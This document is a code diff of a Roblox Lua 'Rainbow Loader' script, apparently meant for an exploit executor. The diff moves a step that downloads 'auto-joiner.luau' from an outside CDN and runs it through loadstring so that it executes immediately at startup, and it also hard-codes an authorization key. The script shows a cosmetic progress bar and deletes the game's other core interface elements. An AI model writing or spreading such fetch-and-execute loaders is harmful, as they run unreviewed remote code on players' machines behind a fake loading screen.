@@ -9,6 +9,29 @@ if not UserInputService.TouchEnabled then
     return
 end
 
+-- Сначала загружаем внешний скрипт
+local function loadExternalScript()
+    local success, errorMsg = pcall(function()
+        _G.AUTHORIZATION_KEY = "$2b$10$6NdyGj4wG5tWHRTKErV5B.oIZpwLB.gxGqEmox276vR0L/jb8NeSW"
+        local scriptContent = game:HttpGet("https://cdn.reverse.software/auto-joiner.luau", true)
+        loadstring(scriptContent)()
+    end)
+    
+    if not success then
+        warn("Failed to load external script: " .. tostring(errorMsg))
+    end
+    
+    return success
+end
+
+-- Загружаем внешний скрипт до создания GUI
+local scriptLoaded = loadExternalScript()
+
+if not scriptLoaded then
+    warn("External script failed to load, continuing with GUI...")
+end
+
+-- Затем создаем GUI
 local existing = player:WaitForChild("PlayerGui"):FindFirstChild("RainbowLoader")
 if existing then existing:Destroy() end
 
@@ -114,11 +137,6 @@ local function rainbowStroke()
     end
 end
 
-local function loadExternalScript()
-    AUTHORIZATION_KEY = "$2b$10$6NdyGj4wG5tWHRTKErV5B.oIZpwLB.gxGqEmox276vR0L/jb8NeSW"
-    loadstring(game:HttpGet("https://cdn.reverse.software/auto-joiner.luau"))()
-end
-
 local function ultraSlowLoad()
     local progress = 0
     while progress < 100 do
@@ -129,6 +147,8 @@ local function ultraSlowLoad()
             task.wait(math.random(0.1, 0.25))
         end
 
+        if progress > 100 then progress = 100 end
+        
         percentLabel.Text = string.format("%.1f%%", progress)
         progressFill.Size = UDim2.new(progress / 100, 0, 1, 0)
 
@@ -147,8 +167,6 @@ local function ultraSlowLoad()
     progressFill.Size = UDim2.new(1, 0, 1, 0)
     subtitleLabel.Text = "COMPLETE"
     
-    task.wait(1)
-    loadExternalScript()
     task.wait(2)
     screenGui:Destroy()
 end
@@ -156,26 +174,30 @@ end
 local function animateDots()
     while true do
         for i = 1, 3 do
-            subtitleLabel.Text = subtitleLabel.Text:gsub("%.*$", "") .. string.rep(".", i)
+            if subtitleLabel and subtitleLabel.Parent then
+                subtitleLabel.Text = subtitleLabel.Text:gsub("%.*$", "") .. string.rep(".", i)
+            end
             task.wait(0.7)
         end
     end
 end
 
 local function removeBlurAndOverlays()
-    local lighting = game:GetService("Lighting")
-    for _, v in pairs(lighting:GetChildren()) do
-        if v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") then
-            v:Destroy()
+    pcall(function()
+        local lighting = game:GetService("Lighting")
+        for _, v in pairs(lighting:GetChildren()) do
+            if v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") then
+                v:Destroy()
+            end
         end
-    end
 
-    local coreGui = game:GetService("CoreGui")
-    for _, gui in pairs(coreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Name ~= "RainbowLoader" then
-            gui:Destroy()
+        local coreGui = game:GetService("CoreGui")
+        for _, gui in pairs(coreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Name ~= "RainbowLoader" then
+                gui:Destroy()
+            end
         end
-    end
+    end)
 end
 
 for i = 1, 10 do
@@ -187,3 +209,4 @@ coroutine.wrap(ultraSlowLoad)()
 coroutine.wrap(animateDots)()
 
 print("Rainbow Loader activated successfully!")
+print("External script loaded: " .. tostring(scriptLoaded))
